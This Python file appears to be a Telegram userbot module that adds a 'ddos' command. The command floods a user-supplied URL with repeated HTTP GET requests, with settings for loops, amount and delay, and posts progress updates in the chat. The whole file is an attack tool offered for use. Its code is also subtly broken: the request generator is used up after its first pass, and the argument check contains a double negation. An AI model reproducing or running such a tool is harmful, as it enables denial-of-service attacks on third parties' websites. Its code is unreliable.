from helper import module, Message, session
from validators import url
from asyncio import gather, sleep

rave = '<b><a href="https://t.me/lordnet_userbot/3">Dxrk ダーク - RAVE</a></b>'


@module(
    cmds="ddos",
    args=["link", "loops", "amount", "delay", "edit"],
    desc="DDOS a website, default loops = 1, amount = 1000, delay = 0, edit = 0",
)
async def ddos_cmd(_, message: Message):
    """
    DDOS a website
    """
    if len(message.command) == 1:
        await message.edit(f"<b>🌴 Please provide a website to DDOS 🌴</b>")
        return
    elif not url(message.command[1]):
        return await message.edit(f"<b>🌴 Invalid URL 🌴</b>")
    elif len(message.command) > 2 and not message.command[2].isdigit():
        return await message.edit(f"<b>🌴 Invalid amount of loops 🌴</b>")
    elif len(message.command) > 3 and not message.command[3].isdigit():
        return await message.edit(f"<b>🌴 Invalid amount of times 🌴</b>")
    elif len(message.command) > 4 and not message.command[4].isdigit():
        return await message.edit(f"<b>🌴 Invalid delay 🌴</b>")
    elif len(message.command) > 5 and not message.command[5] not in ["0", "1"]:
        return await message.edit(f"<b>🌴 Invalid edit (user 0 or 1) 🌴</b>")
    else:
        loops = 1
        amount = 1000
        delay = 0.1
        edit = False
        try:
            link = message.command[1]
            loops = int(message.command[2])
            amount = int(message.command[3])
            delay = int(message.command[4])
            edit = bool(int(message.command[5]))
        except IndexError:
            link = message.command[1]

    await message.edit(f"<b>🌴 DDOSing {message.command[1]} 🌴</b>")

    funcs = (session.get(link) for _ in range(loops))
    for c in range(amount):
        await gather(*funcs)
        percent = round(c / amount * 100)
        if edit:
            await message.edit(
                f"<b>🌴 DDOSing {message.command[1]} 🌴 (<code>{percent}%</code>)</b>"
            )
        await sleep(delay)

    await message.edit(f"<b>🌴 DDOS on {message.command[1]} completed successfully (<code>100%</code>)</b>")
